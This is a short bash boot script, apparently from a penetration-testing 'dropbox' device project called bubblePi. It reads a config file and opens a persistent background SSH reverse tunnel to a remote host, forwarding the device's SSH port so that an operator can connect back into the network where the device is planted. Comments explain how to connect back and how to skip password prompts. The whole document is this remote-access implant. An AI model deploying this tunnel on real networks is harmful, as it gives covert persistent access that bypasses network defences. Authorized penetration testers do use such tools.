#!/bin/bash

# Set Path variable ----DO NOT DELETE THIS OR THE SCRIPT WILL NOT RUN ON BOOT
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/bubblePi

# Place conf file here
. shell.conf

# Reverse Shell with SSH.
# On remote host, use "ssh -l root -p <insert revPort> localhost" to connect back to this dropbox
# Be sure to use 'ssh-copy-id <remote host>' first to accept the certificate and not use password authentication
ssh -i /root/BubblePi.pem -o ServerAliveInterval=60 -N -R $revPort:localhost:22 ${userName//[[:space:]]}@${reverseDest//[[:space:]]} &
